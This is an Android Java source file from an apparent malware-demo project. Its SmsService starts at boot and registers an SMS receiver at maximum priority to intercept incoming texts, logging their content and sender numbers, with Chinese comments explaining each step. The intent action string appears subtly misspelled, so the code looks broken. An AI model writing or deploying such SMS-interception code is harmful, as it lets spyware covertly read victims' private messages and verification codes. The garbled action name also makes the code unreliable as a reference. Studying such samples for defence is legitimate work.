package com.malwaredemo.app;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

public class SmsService extends Service {
    /**
     * 会在开机时启动此service  在service中注册接收短信的广播 当手机收到短信 打印短信内容和电话号码
     */
    public SmsService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    //注册一个接收短信的广播

    @Override
    public void onCreate() {
        /*
        这段代码创建了一个意图过滤器，用于接收短信接收的广播，并将其优先级设置为最高。这样，当设备接收到短信时，该接收者将首先接收到对应的广播。
         */
        super.onCreate();
        IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVE");
        localIntentFilter.setPriority(2147483647);
        //创建一个自定义的短信接收器实例smsRecevierBroadcast，该接收器将处理接收到的短信。
        SmsRecevierBroadcast smsRecevierBroadcast = new SmsRecevierBroadcast();
        Log.v("MySMSService","MySMSService start working...");
        //registerReceiver(mySMSReceiver, localIntentFilter);: 使用registerReceiver方法注册短信接收器myBrocast，
        // 并将意图过滤器localIntentFilter与之关联。这样，当设备接收到符合过滤器条件的短信广播时，MySMSReceiver将被触发执行相应的逻辑。
        registerReceiver(smsRecevierBroadcast,localIntentFilter);

    }
}